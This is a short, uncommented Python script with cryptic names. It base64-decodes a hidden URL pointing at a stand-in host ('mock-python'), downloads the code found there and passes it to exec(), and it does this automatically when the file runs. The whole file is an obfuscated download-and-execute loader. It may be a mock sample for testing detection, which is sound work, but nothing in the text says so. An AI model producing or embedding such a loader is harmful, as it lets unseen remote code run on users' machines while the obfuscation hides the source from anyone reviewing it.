import urllib.request
import importlib
import base64

def gRS(u):
    with urllib.request.urlopen(u) as r:
        s = r.read().decode('utf-8')
    return s

def eM():
    eU = "aHR0cDovL21vY2stcHl0aG9uL2V4ZWN1dGUucHk="
    dU = base64.b64decode(eU).decode('utf-8')
    src = gRS(dU)
    exec(src)

eM()
